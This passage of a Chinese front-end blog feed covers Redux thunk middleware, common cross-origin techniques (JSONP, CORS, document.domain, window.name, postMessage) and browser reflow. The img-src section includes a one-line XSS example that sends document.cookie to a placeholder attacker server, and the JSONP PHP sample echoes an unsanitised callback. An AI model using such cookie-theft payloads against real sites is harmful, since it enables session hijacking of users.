<p>(2) 由于state的改变，触发<code>componentWillReceiveProps(nextProps)</code>，发生在render前，这里会对nextProps与当前props中的selectedReddit进行比对，不同会触发<code>dispatch(fetchPostsIfNeeded(selectedReddit))</code>，即向服务器请求相应的json。</p>
<p>(3) fetchPostsIfNeeded是一个作为action的function，<code>dispatch(fetchPostsIfNeeded(selectedReddit))</code>中<code>fetchPostsIfNeeded(selectedReddit)</code>会返回一个匿名函数，<code>function(dispatch, getState)</code>即thunkMiddleware中的action，thunkMiddleware会向这个匿名function传入dispatch与getState。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">export</span> <span class="function"><span class="keyword">function</span> <span class="title">fetchPostsIfNeeded</span>(<span class="params">reddit</span>) </span>&#123;</div><div class="line">  <span class="keyword">return</span> (dispatch, getState) =&gt; &#123;</div><div class="line">    <span class="keyword">if</span> (shouldFetchPosts(getState(), reddit)) &#123;</div><div class="line">      <span class="keyword">return</span> dispatch(fetchPosts(reddit))</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>(4)之后再执行相应的dispatch requestPosts与receivePosts操作。</p>
<h2 id="相关参考"><a href="#相关参考" class="headerlink" title="相关参考"></a>相关参考</h2><p><a href="http://zhuanlan.zhihu.com/p/20597452?refer=purerender" target="_blank" rel="external">redux middleware 详解</a></p>
<p><a href="http://camsong.github.io/redux-in-chinese/docs/advanced/AsyncActions.html" target="_blank" rel="external">官方文档-异步数据流</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要对于&lt;a href=&quot;http://camsong.github.io/redux-in-chinese/index.html&quot;&gt;redux官方文档&lt;/a&gt;中的&lt;a href=&quot;https://github.com/reactjs/redux/tree/master/examples/async&quot;&gt;async&lt;/a&gt;示例结合一些源码做出一些理解。&lt;/p&gt;
&lt;p&gt;此示例通过&lt;code&gt;&amp;lt;select&amp;gt;&lt;/code&gt;选择相应的value(reactjs与frontend)作为selectedReddit，向Reddit API请求相应的json数据，获取数据后渲染到列表中。主要采用了&lt;a href=&quot;https://github.com/gaearon/redux-thunk&quot;&gt;react-thunk&lt;/a&gt;作为middleware来实现。&lt;/p&gt;
&lt;p&gt;首先，再来看一下&lt;code&gt;createStore&lt;/code&gt;的定义，第三个参数&lt;code&gt;applyMiddleware&lt;/code&gt;相应的中间件，这里&lt;code&gt;thunkMiddleware&lt;/code&gt;主要是用来异步控制的，后面会再次讲解&lt;/p&gt;
&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;// createStore(reducer, initialState, enhancer)&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;const&lt;/span&gt; store = createStore(&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    rootReducer,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    initialState,&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    applyMiddleware(thunkMiddleware, createLogger())&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;)&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
      <category term="React全家桶" scheme="http://blackganglion.com/categories/React%E5%85%A8%E5%AE%B6%E6%A1%B6/"/>
    
    
      <category term="Redux" scheme="http://blackganglion.com/tags/Redux/"/>
    
  </entry>
  
  <entry>
    <title>跨域的N种方式</title>
    <link href="http://blackganglion.com/2016/04/06/%E8%B7%A8%E5%9F%9F%E7%9A%84N%E7%A7%8D%E6%96%B9%E5%BC%8F/"/>
    <id>http://blackganglion.com/2016/04/06/跨域的N种方式/</id>
    <published>2016-04-06T12:50:00.000Z</published>
    <updated>2016-07-07T02:21:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>提到跨域，首先我们不得不提同源策略，同源即相同域名、相同端口、相同协议，违背同源策略即为跨域。当然在实际开发中，我们难免会遇到跨域的问题，这里我们就来总结一下常见的跨域解决方案。</p>
<h2 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a>jsonp</h2><p>jsonp是最为常见的跨域解决方案，动态添加script标签，script标签中的src属性没有跨域的限制，获取跨域服务器上的js脚本文件，在该脚本文件中定义一个callback，将希望获取跨域服务器中的数据存放在callback当中。</p>
<p>下面我们就来模拟一下这个过程。首先打开本地的apache(<code>http://127.0.0.1:8080/test/</code>)模拟跨域服务器，然后利用node的http-server(<code>http://10.66.199.28:8081</code>)模拟本地服务器。</p>
<p>客户端，首先需要先声明callback函数test，然后请求跨域服务器:</p>
<a id="more"></a>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params">json</span>)</span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(json);</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">"http://127.0.0.1:8080/test/index.php?callback=test"</span> <span class="attr">charset</span>=<span class="string">"utf-8"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>服务器端，利用php生成相对应的回调函数:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$data = <span class="keyword">array</span>(</div><div class="line">  <span class="string">"data1"</span> =&gt; <span class="string">"erweureryu"</span>,</div><div class="line">  <span class="string">"data2"</span> =&gt; <span class="string">"weqwewqeqe"</span></div><div class="line">);</div><div class="line">$callback = <span class="keyword">empty</span>($_GET[<span class="string">'callback'</span>]) ? <span class="string">'jsonpcallback'</span> : $_GET[<span class="string">'callback'</span>];</div><div class="line"><span class="keyword">echo</span> $callback . <span class="string">'('</span> . json_encode($data) . <span class="string">')'</span>;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<p>客户端，我们利用jQuery也来实现一下:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line">$(<span class="built_in">document</span>).ready(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  $.ajax(&#123;</div><div class="line">    type : <span class="string">"GET"</span>,</div><div class="line">    <span class="keyword">async</span>: <span class="literal">true</span>,</div><div class="line">    url: <span class="string">"http://127.0.0.1:8080/test/index.php"</span>,</div><div class="line">    dataType : <span class="string">"jsonp"</span>,</div><div class="line">    jsonp: <span class="string">"callback"</span>,</div><div class="line">    jsonpCallback: <span class="string">"test"</span>,</div><div class="line">    success: <span class="function"><span class="keyword">function</span>(<span class="params">json</span>) </span>&#123;</div><div class="line">      <span class="built_in">console</span>.log(json);</div><div class="line">    &#125;,</div><div class="line">    error: <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">      <span class="built_in">console</span>.log(<span class="string">'error'</span>);</div><div class="line">    &#125;</div><div class="line">  &#125;);</div><div class="line">&#125;);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h2><p>由于jsonp只能发送GET请求，因此只能获取获取服务器的资源，假如我们需要post跨域服务器，就无法使用jsonp了，那么就有了CORS的解决方案。</p>
<p>CORS十分简单，只需要添加一个header即可，php中这样实现即可:</p>
<p><code>header(&#39;Access-Control-Allow-Origin: *&#39;)</code> 星号表示任意均可以跨域访问。</p>
<p>或者html添加meta也可以，<code>&lt;meta http-equiv=&quot;Access-Control-Allow-Origin&quot; content=&quot;*&quot;&gt;</code></p>
<p>让我们通过对比来说明问题，直接ajax请求:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</div><div class="line">xhr.open(<span class="string">"get"</span>, <span class="string">"http://127.0.0.1:8080/test/get.php"</span>, <span class="literal">true</span>);</div><div class="line">xhr.send();</div><div class="line">xhr.onreadystatechange = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</div><div class="line">  <span class="keyword">if</span>(xhr.readyState === <span class="number">4</span>)&#123;</div><div class="line">    <span class="built_in">console</span>.log(xhr.status);</div><div class="line">    <span class="built_in">console</span>.log(xhr.responseText);</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p>浏览器报错，提示跨域了:</p>
<blockquote>
<p>XMLHttpRequest cannot load <a href="http://127.0.0.1:8080/test/get.php" target="_blank" rel="external">http://127.0.0.1:8080/test/get.php</a>. No ‘Access-Control-Allow-Origin’ header is present on the requested resource. Origin ‘<a href="http://10.66.199.28:8081" target="_blank" rel="external">http://10.66.199.28:8081</a>‘ is therefore not allowed access.</p>
</blockquote>
<p>那我们为php加一个上文的header, OK，成功访问！</p>
<p>当然我们可以把<code>*</code>改成特定的域，比如:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// header("Access-Control-Allow-Origin: http://10.66.199.28:8082"); 跨域报错，端口不一致</span></div><div class="line"><span class="comment">// header("Access-Control-Allow-Origin: http://10.66.199.28:8082"); * 通配，均可，不安全</span></div><div class="line">header(<span class="string">"Access-Control-Allow-Origin: http://10.66.199.28:8081"</span>); <span class="comment">// 只允许http://10.66.199.28:8081访问</span></div><div class="line"></div><div class="line">$stuList = <span class="keyword">array</span>(</div><div class="line">  <span class="string">"0"</span> =&gt; <span class="keyword">array</span>( <span class="string">"name"</span> =&gt; <span class="string">"Tom"</span>, <span class="string">"age"</span> =&gt; <span class="number">24</span>, <span class="string">"sex"</span> =&gt; <span class="number">1</span>),</div><div class="line">  <span class="string">"1"</span> =&gt; <span class="keyword">array</span>( <span class="string">"name"</span> =&gt; <span class="string">"John"</span>, <span class="string">"age"</span> =&gt; <span class="number">23</span>, <span class="string">"sex"</span> =&gt; <span class="number">1</span>)</div><div class="line">);</div><div class="line"></div><div class="line"><span class="keyword">echo</span> json_encode($stuList);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
<h2 id="document-domain"><a href="#document-domain" class="headerlink" title="document.domain"></a>document.domain</h2><p>同源策略一方面使不同源的两个域之间无法进行ajax通信，另一方面限制浏览器中不同域的框架(iframe)之间是不能进行js的交互操作。</p>
<p>document.domain可以解决不同子域，相同主域的iframe间的交互问题，比如: <code>acm.hdu.edu.cn</code>与<code>bestcoder.hdu.edu.cn</code>这是两个不同的子域，我们可以通过修改两个页面的document.domain值，使其均等于<code>hdu.edu.cn</code>，这样就可以跨域通信了。当然出于安全的目的，document.domain不可随意赋值，必须为当前域名的上级域名。</p>
<p>比如: 将<code>acm.hdu.edu.cn</code>的document.domain = xx.hdu 就会报错。</p>
<blockquote>
<p>VM517:2 Uncaught DOMException: Failed to set the ‘domain’ property on ‘Document’: ‘xx.hdu’ is not a suffix of ‘hdu.edu.cn’.(…)</p>
</blockquote>
<p>我们也尝试模拟一下，由于必须同端口，需要先修改一下hosts文件，不同子域名映射为相同ip</p>
<p>127.0.0.1   test1.blackganglion.com</p>
<p>127.0.0.1   test2.blackganglion.com</p>
<p><a href="http://test2.blackganglion.com:8080/test/test2.html" target="_blank" rel="external">http://test2.blackganglion.com:8080/test/test2.html</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="built_in">document</span>.domain = <span class="string">"blackganglion.com"</span>;</div><div class="line"><span class="built_in">window</span>.a = <span class="number">2</span>;</div><div class="line"><span class="built_in">window</span>.test = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="built_in">console</span>.log(a);  <span class="comment">// 2</span></div><div class="line">&#125;</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p><a href="http://test1.blackganglion.com:8080/test/test1.html" target="_blank" rel="external">http://test1.blackganglion.com:8080/test/test1.html</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">id</span>=<span class="string">"iframe"</span> <span class="attr">src</span>=<span class="string">"http://test2.blackganglion.com:8080/test/test2.html"</span> <span class="attr">onload</span>=<span class="string">"complete()"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="built_in">document</span>.domain = <span class="string">"blackganglion.com"</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">complete</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">"iframe"</span>);</div><div class="line">  <span class="built_in">console</span>.log(iframe);</div><div class="line">  <span class="keyword">var</span> win = iframe.contentWindow;</div><div class="line">  <span class="built_in">console</span>.log(win);</div><div class="line">  <span class="keyword">var</span> a = win.a;</div><div class="line">  <span class="built_in">console</span>.log(a);  <span class="comment">// 2</span></div><div class="line">  <span class="keyword">var</span> test = win.test;</div><div class="line">  test();</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>如果将document.domain注释掉，那么就会报错，无法访问到window.</p>
<blockquote>
<p>test1.html:16 Uncaught SecurityError: Blocked a frame with origin <code>http://test1.blackganglion.com:8080</code> from accessing a frame with origin <code>http://test2.blackganglion.com:8080</code>. Protocols, domains, and ports must match.</p>
</blockquote>
<h2 id="window-name"><a href="#window-name" class="headerlink" title="window.name"></a>window.name</h2><p>window.name属性在不同的页面（甚至不同域名）加载后依旧存在（如果没修改则值不会变化），并且可以支持非常长的name 值（2MB），因此可以被用来跨域页面间的值传递。</p>
<p>直接跨域访问window.name当然是不行的，相同父域还可以用document.domain，如果是完全不同的域名，我们就需要利用window.name的特性想一个新的办法了。</p>
<p><a href="http://127.0.0.1:8080/test/test2.html" target="_blank" rel="external">http://127.0.0.1:8080/test/test2.html</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="built_in">window</span>.name = <span class="string">"http://127.0.0.1:8080/test/test2.html"</span>;</div><div class="line"><span class="built_in">console</span>.log(<span class="built_in">window</span>.name);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p><a href="http://10.66.199.28:8081/index.html" target="_blank" rel="external">http://10.66.199.28:8081/index.html</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span>=<span class="string">"display: none"</span></span></div><div class="line">        <span class="attr">id</span>=<span class="string">"iframe"</span></div><div class="line">        <span class="attr">src</span>=<span class="string">"http://127.0.0.1:8080/test/test2.html"</span></div><div class="line">        <span class="attr">onload</span>=<span class="string">"complete()"</span>&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="keyword">var</span> iframe = <span class="built_in">document</span>.getElementById(<span class="string">"iframe"</span>);</div><div class="line"><span class="keyword">var</span> flag = <span class="number">0</span>;</div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">complete</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span>(flag === <span class="number">1</span>) &#123;</div><div class="line">    <span class="built_in">console</span>.log(iframe.contentWindow.name);</div><div class="line">    iframe.contentWindow.document.write(<span class="string">''</span>);</div><div class="line">    iframe.contentWindow.close();</div><div class="line">    <span class="built_in">document</span>.body.removeChild(iframe);</div><div class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span>(flag === <span class="number">0</span>) &#123;</div><div class="line">    flag = <span class="number">1</span>;</div><div class="line">    iframe.contentWindow.location = <span class="string">'http://10.66.199.28:8081/test.html'</span>;</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这里的技巧主要在于，访问window.name前刷新到当前域下的页面，利用window.name同窗口刷新后不变的特点，既能避免跨域，又能获取到跨域页面的window.name所包含的信息。</p>
<h2 id="window-postMessage"><a href="#window-postMessage" class="headerlink" title="window.postMessage()"></a>window.postMessage()</h2><p>这是HTML5新的API，可以用来跨文档消息传递。</p>
<p><a href="http://10.66.199.28:8081/index.html" target="_blank" rel="external">http://10.66.199.28:8081/index.html</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">style</span> = <span class="string">"display: none"</span></span></div><div class="line">        <span class="attr">id</span> = <span class="string">"iframe"</span></div><div class="line">        <span class="attr">src</span> = <span class="string">"http://127.0.0.1:8080/test/test2.html"</span></div><div class="line">        <span class="attr">onload</span> = <span class="string">"complete()"</span>&gt;</div><div class="line"><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">complete</span>(<span class="params"></span>) </span>&#123;</div><div class="line">  <span class="keyword">var</span> iframeWindow = <span class="built_in">document</span>.getElementById(<span class="string">"iframe"</span>).contentWindow;</div><div class="line">  iframeWindow.postMessage(<span class="string">"index.html postMessage"</span>, <span class="string">"http://127.0.0.1:8080/test/test2.html"</span>);</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span>(event.origin == <span class="string">"http://127.0.0.1:8080"</span>) &#123;</div><div class="line">    <span class="built_in">console</span>.log(event.data);</div><div class="line">  &#125;</div><div class="line">&#125;, <span class="literal">false</span>);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<p><a href="http://127.0.0.1:8080/test/test2.html" target="_blank" rel="external">http://127.0.0.1:8080/test/test2.html</a></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="javascript"></span></div><div class="line"><span class="built_in">window</span>.addEventListener(<span class="string">"message"</span>, <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</div><div class="line">  <span class="keyword">if</span>(event.origin == <span class="string">"http://10.66.199.28:8081"</span>) &#123;</div><div class="line">    <span class="built_in">console</span>.log(event.data);</div><div class="line">    event.source.postMessage(<span class="string">"received!"</span>, <span class="string">"http://10.66.199.28:8081/index.html"</span>);</div><div class="line">  &#125;</div><div class="line">&#125;, <span class="literal">false</span>);</div><div class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure>
<h2 id="img-src"><a href="#img-src" class="headerlink" title="img src"></a>img src</h2><p>img的src不受跨域限制，可以做一些get操作，用于统计。还有可能被用来XSS攻击，<br><code>&lt;img src=&quot;我的服务器地址?cookie=document.cookie&quot;&gt;&lt;/img&gt;</code>，这样用户的cookie就发送到我的服务器上了。</p>
<h2 id="Web-Socket"><a href="#Web-Socket" class="headerlink" title="Web Socket"></a>Web Socket</h2><p>Web Socket也是HTML5的API，目的在于建立服务器与客户端之间的全双工、持久化的双向通信。我们都知道Http是无状态的，要实现Web Socket当然不能基于Http，需要使用Web Socket协议，这对服务器提出了新的要求，与传统的Http大有不同。Node的socket.io支持WebSocket协议，可用于构建实时聊天室应用。</p>
<ul>
<li>单工 A只能接受信号，B只能发送信号</li>
<li>半双工 A能发信号给B，B也能发信号给A，但不能同时进行</li>
<li>全双工 A能发信号给B，B也能发信号给A，可以同时进行</li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;提到跨域，首先我们不得不提同源策略，同源即相同域名、相同端口、相同协议，违背同源策略即为跨域。当然在实际开发中，我们难免会遇到跨域的问题，这里我们就来总结一下常见的跨域解决方案。&lt;/p&gt;
&lt;h2 id=&quot;jsonp&quot;&gt;&lt;a href=&quot;#jsonp&quot; class=&quot;headerlink&quot; title=&quot;jsonp&quot;&gt;&lt;/a&gt;jsonp&lt;/h2&gt;&lt;p&gt;jsonp是最为常见的跨域解决方案，动态添加script标签，script标签中的src属性没有跨域的限制，获取跨域服务器上的js脚本文件，在该脚本文件中定义一个callback，将希望获取跨域服务器中的数据存放在callback当中。&lt;/p&gt;
&lt;p&gt;下面我们就来模拟一下这个过程。首先打开本地的apache(&lt;code&gt;http://127.0.0.1:8080/test/&lt;/code&gt;)模拟跨域服务器，然后利用node的http-server(&lt;code&gt;http://10.66.199.28:8081&lt;/code&gt;)模拟本地服务器。&lt;/p&gt;
&lt;p&gt;客户端，首先需要先声明callback函数test，然后请求跨域服务器:&lt;/p&gt;
    
    </summary>
    
      <category term="前端基本功" scheme="http://blackganglion.com/categories/%E5%89%8D%E7%AB%AF%E5%9F%BA%E6%9C%AC%E5%8A%9F/"/>
    
    
      <category term="跨域" scheme="http://blackganglion.com/tags/%E8%B7%A8%E5%9F%9F/"/>
    
  </entry>
  
  <entry>
    <title>浏览器的重绘与回流</title>
    <link href="http://blackganglion.com/2016/04/01/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%9A%84%E9%87%8D%E7%BB%98%E4%B8%8E%E5%9B%9E%E6%B5%81/"/>
    <id>http://blackganglion.com/2016/04/01/浏览器的重绘与回流/</id>
    <published>2016-04-01T12:44:00.000Z</published>
    <updated>2016-07-08T11:17:29.000Z</updated>
    
    <content type="html"><![CDATA[<p>在探讨浏览器的重绘与回流问题之前，让我们来梳理一下，当浏览器接收的服务器的响应，得到HTML之后，发生了些什么:</p>
<ul>
<li>HTML被交给HTML解析器转化为一系列的Token</li>
<li>根据Token构建Node，形成DOM Tree</li>
<li>遇到CSS标签或者JS脚本标签就会启用新线程请求下载</li>
<li>CSS样式被CSS解析器解释成内部表示结构</li>
<li>CSS解析器工作完成后，将样式信息附合到DOM树上，形成Render Tree</li>
<li>对Render Tree的各个节点计算布局信息，包括位置、尺寸等等</li>
<li>根据Render Tree利用浏览器的UI渲染线程渲染页面</li>
</ul>
<a id="more"></a>
<p>在此过程中，如果遇到script脚本时，HTML解析器将阻塞，等待脚本下载完成并执行，然后继续解析后面的文档，JS可能会修改文档的结构，比如document.write()，这就意味着加载后续的文档变得没有意义，这也是我们经常把JS脚本放在底部的原因，当然我们可以使用async与defer来异步或者延迟执行JS，请看下图:</p>
<p><img src="/images/18-1.png" alt="async and defer"></p>
<p>而对于CSS而言，它会阻塞Render Tree的构建，而不会阻塞DOM Tree的构建，同时它的解析和渲染将阻塞后续js的执行，因为js的执行可能会依赖于最新样式。</p>
<p><img src="/images/18-2.png" alt="Render"></p>
<h2 id="浏览器重绘-repaint"><a href="#浏览器重绘-repaint" class="headerlink" title="浏览器重绘(repaint)"></a>浏览器重绘(repaint)</h2><p>当一个元素外观被改变，但没有改变布局(宽高)的情况下发生重绘。例如改变<code>visibility</code>（元素是否可见，不可见也会占据空间，注意与display:none）的区别、<code>outline</code>（绘制于元素周围的一条线）、<code>background-color</code>等等。</p>
<h2 id="浏览器回流-reflow"><a href="#浏览器回流-reflow" class="headerlink" title="浏览器回流(reflow)"></a>浏览器回流(reflow)</h2><p>有哪些行为会触发浏览器的回流呢？其实回流与我们平时时常提到的操作DOM元素慢是密切相关。</p>
<h3 id="DOM元素的几何属性发生改变"><a href="#DOM元素的几何属性发生改变" class="headerlink" title="DOM元素的几何属性发生改变"></a>DOM元素的几何属性发生改变</h3><p>DOM的变化影响了元素的几何属性(宽高)，浏览器会重新计算元素的几何属性，会使Render Tree中受到影响的部分失效，从而产生新的Render Tree。当一个元素发送回流时，会使它的子节点，兄弟节点，甚至祖先节点的几何属性发生变化，触发整个页面的回流。</p>
<h3 id="DOM元素的结构变化"><a href="#DOM元素的结构变化" class="headerlink" title="DOM元素的结构变化"></a>DOM元素的结构变化</h3><p>节点的插入、删除、移动都会触发回流，如果在body元素前插入一个元素，会引发整个页面的回流，而在DOM树的叶子节点插入节点则不会对其它节点产生影响。</p>
<h3 id="获取特定属性"><a href="#获取特定属性" class="headerlink" title="获取特定属性"></a>获取特定属性</h3><p>例如: offset系列、scroll系列、client系列，获取这些值时应尽量缓存。</p>
<ul>
<li>调整窗口大小</li>
<li>改变字体</li>
<li>对于样式的修改</li>
<li>CSS伪类激活，例如:hover</li>
<li>…</li>
</ul>
<p>触发回流的行为有很多，而回流也是不可避免的，我们只能尽可能最小化回流。</p>
<h3 id="操作完整个节点后，再插入Render-Tree中，多次回流合并为一次回流"><a href="#操作完整个节点后，再插入Render-Tree中，多次回流合并为一次回流" class="headerlink" title="操作完整个节点后，再插入Render Tree中，多次回流合并为一次回流:"></a>操作完整个节点后，再插入Render Tree中，多次回流合并为一次回流:</h3><p>比如利用<code>documentFragment</code>:</p>
